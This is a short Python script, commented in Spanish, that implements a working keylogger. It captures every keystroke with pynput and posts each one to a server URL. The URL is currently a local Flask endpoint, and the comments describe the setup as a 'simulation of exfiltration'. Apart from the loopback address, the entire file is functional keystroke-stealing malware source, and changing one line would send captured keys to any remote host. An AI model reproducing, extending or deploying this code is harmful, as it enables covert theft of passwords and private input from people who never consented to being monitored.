from pynput import keyboard
import requests

SERVER_URL = "http://127.0.0.1:5000/log"  # servidor Flask local

def on_press(key):
    try:
        data = str(key.char)  # teclas normales
    except AttributeError:
        data = f"[{key}]"     # teclas especiales

    try:
        # Envío al servidor (simulación de exfiltración)
        requests.post(SERVER_URL, data={"key": data})
    except Exception as e:
        print("Error al enviar:", e)

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # salir con ESC

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
